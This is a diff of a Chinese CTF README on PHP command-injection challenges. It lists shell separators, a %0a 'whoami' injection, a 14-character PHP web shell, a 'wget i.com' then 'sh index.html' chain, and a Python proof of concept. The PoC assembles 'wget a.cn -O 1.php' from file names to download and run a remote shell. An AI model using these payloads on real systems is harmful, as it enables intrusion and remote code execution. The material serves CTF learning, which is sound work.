@@ -4,10 +4,11 @@ linux 上任意命令执行,一般会用到下面几个字符
 ```bash 
   `   |   ||   &   &&   .   ;   -   <>   $    %0a 
 ```
-###  [exec1](./exec1.php) 
-用 %0a 来执行命令,只能适用于linux , 127.0.0.1%0awhoami 
----------
+###  [exec1](./exec1.php)
 
+用 %0a 来执行命令,只能适用于linux , 127.0.0.1%0awhoami
+
+---------
 ### [exec2](./exec2.php) 当可输入的字符不够长时,这里包含分割符一共可输入13个字符 
 
 1. 最短的shell是  ```<?`$_GET[c]` ```; 一共十四个字符 
@@ -63,3 +64,39 @@ ip=0.0.0.0;wget i.com
 ip=0.0.0.0;sh index.html  #刚好21个字符
 ```
 然后就获取一个shell  
+
+-------
+### [exec3](./exec3.php) 
+这是7个字符get shell的题目,[writeup在这里](http://wonderkun.cc/index.html/?p=524)
+
+下面只写一个python的poc吧
+```python
+#!/usr/bin/python
+#-*- coding: utf-8 -*- 
+import requests 
+def GetShell():
+    url = "http://192.168.56.129/shell.php?1="
+    fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"] 
+    # linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"
+    # 可以修改hosts文件，让a.cn指向一个自己的服务器。
+    # 在a.cn 的根目录下创建index.html ，内容是一个php shell 
+    for fileName in fileNames:
+        createFileUrl = url+">"+fileName
+        print createFileUrl 
+        requests.get(createFileUrl)
+    getShUrl = url + "ls -t>1"
+    print getShUrl
+    requests.get(getShUrl)
+    getShellUrl = url + "sh 1"
+    print getShellUrl
+    requests.get(getShellUrl)
+    shellUrl = "http://192.168.56.129/1.php"
+    response = requests.get(shellUrl)
+    if response.status_code == 200:
+        print "[*] Get shell !"
+    else :
+        print "[*] fail!"
+if __name__ == "__main__":
+    GetShell()
+    
+```
